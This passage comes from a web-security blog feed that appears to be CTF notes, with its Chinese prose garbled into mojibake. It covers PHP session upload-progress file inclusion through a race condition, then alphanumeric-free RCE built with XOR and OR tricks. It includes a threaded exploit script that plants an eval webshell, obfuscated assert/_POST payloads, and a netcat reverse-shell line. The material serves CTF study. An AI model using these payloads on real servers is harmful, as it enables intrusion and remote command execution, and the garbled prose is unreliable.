åçš„é•¿åº¦æ˜¯åŸé•¿åº¦çš„3/4</p><p>æ‰€ä»¥æ˜¯4ä¸ªå­—èŠ‚ä¸€ç»„ è¿™æ ·æ‰æ»¡è¶³è§£ç è§„åˆ™ï¼Œä¹‹å‰çš„æ˜¯åªå¯¹sessionè¿›è¡Œäº†ç¼–ç ï¼Œç„¶åå¯¹æ‰€æœ‰çš„å†…å®¹è¿›è¡Œäº†è§£ç ï¼Œè¿™æ ·æ˜¯é”™è¯¯çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ ¹æ®è§£ç çš„è§„åˆ™ï¼Œæ„é€ é•¿åº¦ï¼Œè®©å‰é¢çš„èƒ½å¤Ÿæ»¡è¶³4ä½ä¸€ç»„ï¼Œè®©åé¢çš„sessionèƒ½å¤Ÿè¿›è¡Œä¸€ä¸ªè§£ç </p><p>username|s:24:â€ æˆ‘ä»¬è¿™é‡Œä½¿ç”¨çš„æ˜¯phpè§£é‡Šå™¨ï¼Œå…·ä½“çš„è¯·çœ‹sessionååºåˆ—åŒ–  ç”±äºbase64è§£ç åªä¼šå¯¹ A-Zï¼Œa-z,0-9 å’Œ/ + = è¿›è¡Œä¸€ä¸ªè§£ç ï¼Œå…¶ä»–çš„å­—ç¬¦ä¸ä¼šè¿›è¡Œè§£ç </p><p>æ‰€ä»¥ä¸Šé¢çš„å®é™…å°±æ˜¯user name s24  å…±11ä¸ªå­—ç¬¦ï¼Œè¿˜å·®ä¸€ä¸ªï¼Œè¿™æ—¶å°±åœ¨sessionä¼ å…¥é‚£é‡Œæ„é€ å…¶ä»–çš„åƒåœ¾æ•°æ®</p><p>è®©å…¶æ»¡è¶³username|sâ€xxx:â€  å°±æ˜¯3ä½æ•°æ®</p><p><img src="https://s2.loli.net/2023/09/15/tRebZyTG78YQXPq.png" alt="image-20230718185352817.png"> </p><p><img src="https://s2.loli.net/2023/09/15/vR19d7kwZpMNyxT.png" alt="image-20230718185411245.png"></p><h2 id="2-No-session-start"><a href="#2-No-session-start" class="headerlink" title="2.No session_start()"></a>2.No session_start()</h2><p>é¦–å…ˆè¦ç†è§£å‡ ä¸ªsessionä¸­çš„é…ç½®æ˜¯ä»€ä¹ˆæ„æ€</p><p><img src="https://p2.ssl.qhimg.com/t018bf95c18fe0d3587.png" alt="img"></p><p>session.auto_start è¿™ä¸ªé”®å¼€å¯æ—¶ï¼Œä¼šè‡ªåŠ¨è¿›è¡Œsessionçš„åˆå§‹åŒ–ï¼Œä½†æ˜¯ä¸€èˆ¬æƒ…å†µä¸‹æ˜¯é»˜è®¤å…³é—­çš„ã€‚</p><p>session.upload_progress.cleanup è¿™ä¸ªå¼€å¯çš„æ—¶å€™è¡¨ç¤ºå½“ä¸Šä¼ å®Œæˆåphpä¼šç«‹åˆ»æ¸…ç†sessionæ–‡ä»¶çš„å†…å®¹ï¼Œè¿™ä¸ªè·Ÿåé¢çš„æ¡ä»¶ç«äº‰æœ‰å…³</p><p>session.upload_progress_enabled è¿™ä¸ªå¼€å¯çš„æ—¶å€™ï¼Œphpèƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œæ£€æµ‹å…¶è¿›åº¦ã€‚åªæœ‰è¿™ä¸€ä¸ªçš„è¯å¹¶æ²¡æœ‰ä»€ä¹ˆï¼Œä½†æ˜¯ï¼ŒåŒæ—¶POSTä¸€ä¸ªè·Ÿiniä¸­session.upload_progress_nameç›¸åŒåå­—çš„å˜é‡æ—¶ï¼Œå°±ä¼šå°†è¿›åº¦ä¿¡æ¯ä¿å­˜åœ¨sessionä¸­ï¼Œè¿™ä¸€éƒ¨åˆ†æ•°æ®æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œsessionå°±ä¼šè‡ªåŠ¨è¿›è¡Œåˆå§‹åŒ–ï¼Œç´¢å¼•æ˜¯session.upload_progress.prefixå’Œsession.upload_prgress.nameè¿æ¥åœ¨ä¸€èµ·çš„å€¼</p><p><code>session.upload_progress.freq = &quot;1%&quot;</code>+<code>session.upload_progress.min_freq = &quot;1&quot;</code>ï¼šé€‰é¡¹æ§åˆ¶äº†ä¸Šä¼ è¿›åº¦ä¿¡æ¯åº”è¯¥å¤šä¹…è¢«é‡æ–°è®¡ç®—ä¸€æ¬¡ã€‚ é€šè¿‡åˆç†è®¾ç½®è¿™ä¸¤ä¸ªé€‰é¡¹çš„å€¼ï¼Œè¿™ä¸ªåŠŸèƒ½çš„å¼€é”€å‡ ä¹å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚</p><p>session.use_strict_modeä¸º0æ—¶ï¼Œå®ƒçš„PHPSESSIDçš„å€¼æ˜¯ç”±æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„</p><p>ç»¼ä¸Šæ‰€è¿°ï¼Œæ•´ä½“çš„ä¸€ä¸ªæ€æƒ³å°±æ˜¯session.uplaod_progress.nameçš„å€¼æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼ŒåŒæ—¶POSTä¼ é€’æ—¶ï¼Œä¼šå°†å…¶ä¿å­˜åœ¨sessionä¸­ï¼Œå¹¶ä¸”PHPSESSIDçš„å€¼æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ¶æ„æ„é€ session.uplaod_progress.nameçš„å€¼ï¼Œé€šè¿‡æ–‡ä»¶åŒ…å«å’Œæ¡ä»¶ç«äº‰ï¼Œæ¥å®ç°ä¸€ä¸ªå±å®³ã€‚</p><p>å®ç°æ–¹æ³•æ€»å…±æœ‰ä¸¤ç§ï¼Œä¸€ç§å°±æ˜¯é€šè¿‡è„šæœ¬è·‘ï¼Œå¦ä¸€ç§å°±æ˜¯é€šè¿‡bp</p><p>å…ˆæ¥è¯´é€šè¿‡bpçš„ã€‚</p><p>1ï¼Œé¦–å…ˆè¦æ„é€ ä¸€ä¸ªä¸Šä¼ è¡¨å•</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!doctype <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://node4.anna.nssctf.cn:28342/index.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">vaule</span>=<span class="hljs-string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file1&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file2&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„å†…å®¹æ ¹æ®å®é™…æƒ…å†µè¿›è¡Œä¿®æ”¹</p><p>2.ä¿®æ”¹PHPSESSIDçš„å€¼ï¼Œå‘é€åˆ°çˆ†ç ´æ¿å—</p><p><img src="https://s2.loli.net/2023/09/15/pjdLToiImzPtJ2c.png" alt="image-20230719113426206.png"></p><p>3.è®¾ç½®NULL payloads</p><p>4.å°†æ–‡ä»¶åŒ…å«çš„ä¹Ÿå‘é€åˆ°bpçˆ†ç ´æ¨¡å—</p><p><img src="https://s2.loli.net/2023/09/15/jNzfqTe3o7UvO6l.png" alt="image-20230719113547926.png"></p><p>ä¹Ÿè®¾ç½®NULL payloads ç„¶åå°±å¯ä»¥å»è¿æ¥èšå‰‘äº†</p><p>æ–¹æ³•2.é€šè¿‡è„šæœ¬ï¼š<br>ç½‘ä¸Šæ‰¾çš„ä¸€ä¸ª</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-keyword">import</span> requests<br><br>sessid = <span class="hljs-string">&#x27;0&#x27;</span><br>target = <span class="hljs-string">&#x27;http://node4.anna.nssctf.cn:28071/&#x27;</span><br>file = <span class="hljs-string">&#x27;ph0ebus.txt&#x27;</span><br>f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br><br>event = threading.Event()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> event.is_set():  <span class="hljs-comment"># ä½¿ç”¨ event.is_set() æ¥åˆ¤æ–­æ˜¯å¦éœ€è¦ç»§ç»­æ‰§è¡Œ</span><br>        session.post(target, data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,<br>                     files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (file, f)&#125;, cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)  <span class="hljs-comment"># ä¿®æ”¹å‚æ•°åä¸º cookies</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> event.is_set():  <span class="hljs-comment"># ä½¿ç”¨ event.is_set() æ¥åˆ¤æ–­æ˜¯å¦éœ€è¦ç»§ç»­æ‰§è¡Œ</span><br>        resp = session.get(<br>            <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;target&#125;</span>?mode=foo&amp;file=/tmp/sess_<span class="hljs-subst">&#123;sessid&#125;</span>&amp;cmd=system(&#x27;cd /;ls;cat nssctf*&#x27;);&quot;</span>)  <span class="hljs-comment"># ä¿®æ”¹ä¸º get è¯·æ±‚</span><br>        <span class="hljs-keyword">if</span> file <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.<span class="hljs-built_in">set</span>()  <span class="hljs-comment"># å¦‚æœæˆåŠŸè¯»å–åˆ°æ–‡ä»¶å†…å®¹ï¼Œè®¾ç½® eventï¼Œé€€å‡ºå¾ªç¯</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]retry&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    threads = []  <span class="hljs-comment"># å­˜å‚¨çº¿ç¨‹çš„åˆ—è¡¨</span><br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            t1 = threading.Thread(target=write, args=(session,))<br>            threads.append(t1)<br>            t1.start()<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            t2 = threading.Thread(target=read, args=(session,))<br>            threads.append(t2)<br>            t2.start()<br><br>        <span class="hljs-comment"># ç­‰å¾…æ‰€æœ‰çº¿ç¨‹ç»“æŸ</span><br>        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>            t.join()<br><br>    event.<span class="hljs-built_in">set</span>()  <span class="hljs-comment"># è®¾ç½® eventï¼Œä»¥é˜²æ­¢çº¿ç¨‹æ— æ³•é€€å‡ºå¾ªç¯</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ–‡ä»¶åŒ…å«</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ— æ•°å­—å­—æ¯RCE</title>
    <link href="/2023/08/25/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/"/>
    <url>/2023/08/25/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8DRCE/</url>
    
    <content type="html"><![CDATA[<h1 id="æ— æ•°å­—å­—æ¯RCE"><a href="#æ— æ•°å­—å­—æ¯RCE" class="headerlink" title="æ— æ•°å­—å­—æ¯RCE"></a>æ— æ•°å­—å­—æ¯RCE</h1><h2 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ– ^"></a>å¼‚æˆ– ^</h2><p>å¼‚æˆ–è¿ç®—ï¼šç›¸åŒä¸º0 ä¸åŒä¸º1</p><p>ä¸¤ä¸ªå­—ç¬¦çš„asciiç æ‰€å¯¹åº”çš„äºŒè¿›åˆ¶è¿›è¡Œä¸€ä¸ªå¼‚æˆ–è¿ç®—</p><p>ç„¶åæ€æƒ³å°±æ˜¯å°†ä¸¤ä¸ªå­—ç¬¦ä¸²è¿›è¡Œä¸€ä¸ªå¼‚æˆ–è¿ç®— ç»“æœå°±æ˜¯æˆ‘ä»¬æƒ³è¦å¾—åˆ°çš„ä¸€ä¸ªå€¼</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªphpçš„å¼‚æˆ–è¿ç®—çš„è„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$shell</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];<br><span class="hljs-variable">$result1</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$result2</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">judge</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="hljs-variable">$c</span>))<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$num</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$num</span>&lt;=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$shell</span>);<span class="hljs-variable">$num</span>++)<br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$x</span>=<span class="hljs-number">33</span>;<span class="hljs-variable">$x</span>&lt;=<span class="hljs-number">126</span>;<span class="hljs-variable">$x</span>++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">judge</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$x</span>)))<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-variable">$y</span>=<span class="hljs-number">33</span>;<span class="hljs-variable">$y</span>&lt;=<span class="hljs-number">126</span>;<span class="hljs-variable">$y</span>++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">judge</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$y</span>)))<br>                &#123;<br>                    <span class="hljs-variable">$f</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$x</span>)^<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$y</span>);<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f</span> == <span class="hljs-variable">$shell</span>[<span class="hljs-variable">$num</span>])<br>                    &#123;<br>                        <span class="hljs-variable">$result1</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$x</span>);<br>                        <span class="hljs-variable">$result2</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$y</span>);<br>                        <span class="hljs-keyword">break</span> <span class="hljs-number">2</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å¼‚æˆ–è¿ç®—ç¬¬ä¸€éƒ¨åˆ†ï¼š &quot;</span>.<span class="hljs-variable">$result1</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å¼‚æˆ–è¿ç®—ç¬¬äºŒéƒ¨åˆ†ï¼š &quot;</span>.<span class="hljs-variable">$result2</span>;<br>å¼‚æˆ–è¿ç®—ç¬¬ä¸€éƒ¨åˆ†ï¼š<br>å¼‚æˆ–è¿ç®—ç¬¬äºŒéƒ¨åˆ†ï¼š<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ä¸ªpythonçš„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">valid = <span class="hljs-string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span><br>answer = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥è¿›è¡Œå¼‚æˆ–æ„é€ çš„å­—ç¬¦ä¸²ï¼š&quot;</span>))<br>tmp1, tmp2 = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> answer:<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> valid:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> valid:<br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ord</span>(i) ^ <span class="hljs-built_in">ord</span>(j) == <span class="hljs-built_in">ord</span>(c)):<br>        tmp1 += i<br>        tmp2 += j<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>      <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tmp1ä¸º:&quot;</span>,tmp1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tmp2ä¸º:&quot;</span>,tmp2)<br></code></pre></td></tr></table></figure><p>è¾“å…¥æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å°±å¯ä»¥äº†</p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2023/08/25/ejPVdK1hATQyo7C.png" alt="image-20230706202523452.png"></p><p><img src="https://s2.loli.net/2023/08/25/me9wrOgdAEplF42.png" alt="image-20230706203038189.png"></p><p>â€œè¿ç®—ç¬¬ä¸€éƒ¨åˆ†â€^â€è¿ç®—ç¬¬äºŒéƒ¨åˆ†â€  è¿™é‡Œè¦è¿›è¡Œä¸€ä¸ªurlç¼–ç  å› ä¸ºåŠ å·ä¼šè¢«å½“ä½œç©ºæ ¼ æ‰€ä»¥è¦è¿›è¡Œä¸€ä¸ªurlç¼–ç </p><p><strong>php5</strong>ä¸‹å¯ä»¥ç”¨<code>assert($_POST[&#39;_&#39;]);</code> è¿›è¡Œä¸€ä¸ªå‘½ä»¤æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">  <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;_&#x27;</span>]);    <br><span class="hljs-variable">$a</span>=assert;<br><span class="hljs-variable">$b</span>=_POST;<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$$b</span>;<br><span class="hljs-variable">$a</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">&#x27;_&#x27;</span>]);    <span class="hljs-comment">//è®©a=_   è®©b=__ è®©c=___    //å› ä¸ºæ˜¯æ— æ•°å­—å­—æ¯</span><br>    <span class="hljs-meta">?&gt;</span>     <span class="hljs-comment">// assert=&quot;!((%)(&quot;^&quot;@[[@[\\&quot;   _POST=&quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;   æœ€åè¦å¯¹ç»“æœè¿›è¡Œä¸€ä¸ªurlç¼–ç </span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/25/FCjqc2XBkuMzaVv.png" alt="image-20230706211442786.png"></p><p>è®°å¾—urlç¼–ç </p><p>PHP7ä¸‹é¢æ„é€ ä¸€ä¸ªåå¼•å·</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">`<span class="hljs-symbol">$</span>_POST[_]`     <span class="hljs-symbol">$</span>_=<span class="hljs-string">&quot;!+/((&quot;</span>^<span class="hljs-string">&quot;~&#123;`&#123;|&quot;</span>;<span class="hljs-symbol">$</span>__=<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_;`<span class="hljs-symbol">$</span>__[_]`;<br></code></pre></td></tr></table></figure><p>ç„¶åè¿™ä¸ªåˆ©ç”¨åˆ°äº†åå¼¹shell _=nc ip ç›‘å¬ç«¯å£å· -e /bin/bash</p><h2 id="æˆ–"><a href="#æˆ–" class="headerlink" title="æˆ–  |"></a>æˆ–  |</h2><p>æœ‰1åˆ™ä¸º1 ä¸‹é¢æ˜¯è„šæœ¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php">import re<br>import urllib<br><span class="hljs-keyword">from</span> urllib import parse<br>hex_i = <span class="hljs-string">&quot;&quot;</span><br>hex_j = <span class="hljs-string">&quot;&quot;</span><br>pattern=<span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>    <span class="hljs-comment">//è¿™ä¸ªåœ°æ–¹æ˜¯æ ¹æ®é¢˜ç›®è¿›è¡Œä¸€ä¸ªæ­£åˆ™åŒ¹é…</span><br>str1=[<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;cat flag.php&quot;</span>]    <span class="hljs-comment">//è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„</span><br><span class="hljs-keyword">for</span> p in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">2</span>):<br>    t1 = <span class="hljs-string">&quot;&quot;</span><br>    t2 = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> k in str1[p]:<br>        <span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">256</span>):<br>            <span class="hljs-keyword">for</span> j in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">256</span>):<br>                <span class="hljs-keyword">if</span> re.<span class="hljs-title function_ invoke__">search</span>(pattern,<span class="hljs-title function_ invoke__">chr</span>(i)) :<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> re.<span class="hljs-title function_ invoke__">search</span>(pattern,<span class="hljs-title function_ invoke__">chr</span>(j)) :<br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">16</span>:<br>                    hex_i = <span class="hljs-string">&quot;0&quot;</span> + <span class="hljs-title function_ invoke__">hex</span>(i)[<span class="hljs-number">2</span>:]<br>                <span class="hljs-keyword">else</span>:<br>                    hex_i=<span class="hljs-title function_ invoke__">hex</span>(i)[<span class="hljs-number">2</span>:]<br>                <span class="hljs-keyword">if</span> j &lt; <span class="hljs-number">16</span>:<br>                    hex_j=<span class="hljs-string">&quot;0&quot;</span>+<span class="hljs-title function_ invoke__">hex</span>(j)[<span class="hljs-number">2</span>:]<br>                <span class="hljs-keyword">else</span>:<br>                    hex_j=<span class="hljs-title function_ invoke__">hex</span>(j)[<span class="hljs-number">2</span>:]<br>                hex_i=<span class="hljs-string">&#x27;%&#x27;</span>+hex_i<br>                hex_j=<span class="hljs-string">&#x27;%&#x27;</span>+hex_j<br>                c=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(urllib.parse.<span class="hljs-title function_ invoke__">unquote</span>(hex_i))|<span class="hljs-title function_ invoke__">ord</span>(urllib.parse.<span class="hljs-title function_ invoke__">unquote</span>(hex_j)))<br>                <span class="hljs-keyword">if</span>(c ==k):<br>                    t1=t1+hex_i<br>                    t2=t2+hex_j<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">break</span><br>    